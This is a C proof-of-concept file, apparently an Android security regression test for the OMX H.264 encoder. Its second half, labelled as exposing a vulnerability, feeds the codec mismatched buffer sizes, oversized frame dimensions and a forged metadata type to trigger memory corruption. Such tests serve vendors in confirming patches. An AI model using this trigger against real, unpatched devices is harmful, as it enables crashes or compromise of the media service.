/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include "../includes/omxUtils.h"

int main() {
    /* Initialize OMX for the specified codec                            */
    status_t ret = omxUtilsInit((char *) "OMX.google.h264.encoder");
    omxExitOnError(ret);

    /* Get OMX input port parameters                                     */
    OMX_PARAM_PORTDEFINITIONTYPE *params =
            (OMX_PARAM_PORTDEFINITIONTYPE *) malloc(
                    sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
    memset(params, 0, sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
    omxUtilsGetParameter(OMX_UTILS_IP_PORT, params);
    int ipBufferSize = params->nBufferSize;
    int ipBufferCount = params->nBufferCountActual;

    /* Do OMX Metadata settings                                          */
    MetadataBufferType type = kMetadataBufferTypeGrallocSource;
    omxUtilsStoreMetaDataInBuffers(OMX_UTILS_IP_PORT, OMX_TRUE, &type);

    /* Allocate input buffers and graphic buffer                         */
    sp<GraphicBuffer> graphicbuffer = new GraphicBuffer(
            params->format.video.nFrameWidth, params->format.video.nFrameHeight,
            PIXEL_FORMAT_RGBX_8888,
            android::GraphicBuffer::USAGE_HW_VIDEO_ENCODER);

    IOMX::buffer_id *inBufferId = new IOMX::buffer_id[ipBufferCount];
    sp<MemoryDealer> dealerIn = new MemoryDealer(ipBufferSize * ipBufferCount);

    int i;
    /* Register input buffers with OMX component                         */
    for (i = 0; i < ipBufferCount; i++) {
        sp<IMemory> memory = dealerIn->allocate(ipBufferSize);
        memset(memory->pointer(), 0xff, ipBufferSize);
        *(MetadataBufferType *) (memory->pointer()) =
                kMetadataBufferTypeGrallocSource;
        omxUtilsUseBuffer(OMX_UTILS_IP_PORT, memory, &inBufferId[i],
                          ipBufferSize);
        omxUtilsUpdateGraphicBufferInMeta(OMX_UTILS_IP_PORT, graphicbuffer,
                                          inBufferId[i]);
    }

    /* Get OMX output port parameters                                    */
    memset(params, 0, sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
    omxUtilsGetParameter(OMX_UTILS_OP_PORT, params);
    int opBufferSize = params->nBufferSize;
    int opBufferCount = params->nBufferCountActual;

    /* Allocate output buffers                                           */
    IOMX::buffer_id *opBufferId = new IOMX::buffer_id[opBufferCount];
    sp<MemoryDealer> dealerOut = new MemoryDealer(opBufferSize * opBufferCount);

    /* Register output buffers with OMX component                        */
    for (i = 0; i < opBufferCount; i++) {
        sp<IMemory> memoryout = dealerOut->allocate(opBufferSize);
        memset(memoryout->pointer(), 0xff, opBufferSize);
        omxUtilsUseBuffer(OMX_UTILS_OP_PORT, memoryout, &opBufferId[i],
                          opBufferSize);
    }

    /* Do OMX State chage to Idle                                        */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateIdle);

    /* Do OMX State chage to Executing                                   */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateExecuting);

    /* Empty input buffers and fill output buffers                       */
    omxUtilsEmptyBuffer(inBufferId[0], 0, ipBufferSize, 0, 0, -1);
    omxUtilsFillBuffer(opBufferId[0], -1);
    omxUtilsEmptyBuffer(inBufferId[1], 0, ipBufferSize, 0, 0, -1);
    omxUtilsFillBuffer(opBufferId[1], -1);

    /* Do OMX State chage to Idle                                        */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateIdle);

    /* Do OMX State chage to Loaded                                      */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateLoaded);

    /* Free input and output buffers                                     */
    for (i = 0; i < ipBufferCount; i++) {
        omxUtilsFreeBuffer(OMX_UTILS_IP_PORT, inBufferId[i]);
    }
    for (i = 0; i < opBufferCount; i++) {
        omxUtilsFreeBuffer(OMX_UTILS_OP_PORT, opBufferId[i]);
    }

    /*********************************************************************/
    /* Following code exposes vulnerability                              */
    /*********************************************************************/

    /* Get OMX input port parameters, change settings and set output port*/
    /* port parameters                                                   */
    memset(params, 0, sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
    omxUtilsGetParameter(OMX_UTILS_IP_PORT, params);
    params->nBufferSize = 38016;
    params->format.video.nFrameWidth = 2000;
    params->format.video.nFrameHeight = 2000;
    omxUtilsSetParameter(OMX_UTILS_IP_PORT, params);

    /* Allocated input buffers and register with OMX component           */
    sp<MemoryDealer> dealerIn2 = new MemoryDealer(ipBufferSize * ipBufferCount);
    for (i = 0; i < ipBufferCount; i++) {
        sp<IMemory> memory = dealerIn2->allocate(ipBufferSize);
        memset(memory->pointer(), 0xff, ipBufferSize);
        *(MetadataBufferType *) (memory->pointer()) = (MetadataBufferType) 1;
        omxUtilsUseBuffer(OMX_UTILS_IP_PORT, memory, &inBufferId[i],
                          ipBufferSize);
        omxUtilsUpdateGraphicBufferInMeta(OMX_UTILS_IP_PORT, graphicbuffer,
                                          inBufferId[i]);
    }

    /* Allocated output buffers and register with OMX component          */
    sp<MemoryDealer> dealerOut2 = new MemoryDealer(
            opBufferSize * opBufferCount);
    for (i = 0; i < opBufferCount; i++) {
        sp<IMemory> memoryout = dealerOut2->allocate(opBufferSize);
        memset(memoryout->pointer(), 0xff, opBufferSize);
        omxUtilsUseBuffer(OMX_UTILS_OP_PORT, memoryout, &opBufferId[i],
                          opBufferSize);
    }

    /* Do OMX State chage to Idle                                        */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateIdle);

    /* Do OMX State chage to Executing                                   */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateExecuting);

    /* Empty input buffers and fill output buffers                       */
    omxUtilsEmptyBuffer(inBufferId[0], 0, ipBufferSize, 0, 0, -1);
    omxUtilsFillBuffer(opBufferId[0], -1);
    omxUtilsEmptyBuffer(inBufferId[1], 0, ipBufferSize, 0, 0, -1);
    omxUtilsFillBuffer(opBufferId[1], -1);

    /* Do OMX State change to Idle                                       */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateIdle);

    /* Do OMX State change to Loaded                                     */
    omxUtilsSendCommand(OMX_CommandStateSet, OMX_StateLoaded);

    /* Free input and output buffers                                     */
    for (i = 0; i < ipBufferCount; i++) {
        omxUtilsFreeBuffer(OMX_UTILS_IP_PORT, inBufferId[i]);
    }
    for (i = 0; i < opBufferCount; i++) {
        omxUtilsFreeBuffer(OMX_UTILS_OP_PORT, opBufferId[i]);
    }

    /* Free OMX resources                                                */
    omxUtilsFreeNode();
    return 0;
}
